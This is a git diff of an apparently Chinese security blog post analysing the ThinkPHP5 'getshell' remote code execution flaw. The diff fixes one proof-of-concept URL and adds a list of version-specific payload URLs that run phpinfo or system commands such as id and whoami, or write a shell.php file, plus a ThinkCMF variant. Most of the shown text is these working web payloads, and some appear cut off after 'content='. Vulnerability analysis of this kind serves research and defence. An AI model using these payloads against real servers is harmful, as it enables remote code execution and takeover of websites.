@@ -9,7 +9,7 @@ title:  "Thinkphp5 getshell漏洞分析"
 
 ### 在thinkphp5 getshell poc
 这是目前公开5.0.20的poc<br/>
-/index.php?s=index/\think\app/invokefunction&function=call_user_func&var[0]=system&var[1]=ls<br/>
+/index.php?s=index/\think\app/invokefunction&function=call_user_func&var[0]=system&var[1][]=ls<br/>
 ![图片0](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/0.jpg)<br />
 调用过程如下<br/>
 ![图片1](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/1.jpg)<br />
@@ -20,6 +20,15 @@ title:  "Thinkphp5 getshell漏洞分析"
 通过call_user_func执行<br/>
 ![图片3](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/3.jpg)<br />
 并不局限于以上两个方法，但一定是think\这个命名空间下的已知类<br/>
+### thinkphp5不同版本的payload
+1. index.php?s=index/\think\Request/input&filter=phpinfo&data=1<br />
+2. index.php?s=index/\think\Request/input&filter=system&data=id<br />
+3. index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<br />
+4. index.php?s=index/\think\view\driver\Php/display&content=<br />
+5. index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1<br />
+6. index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id<br />
+7. index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1<br />
+8. index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id<br />
 ### thinkcmf利用过程区别
 getshell poc<br/>
 /public/index.php?s=portal/\think\app/invokefunction&function=call_user_func&function_name=system&parameters=whoami<br/>
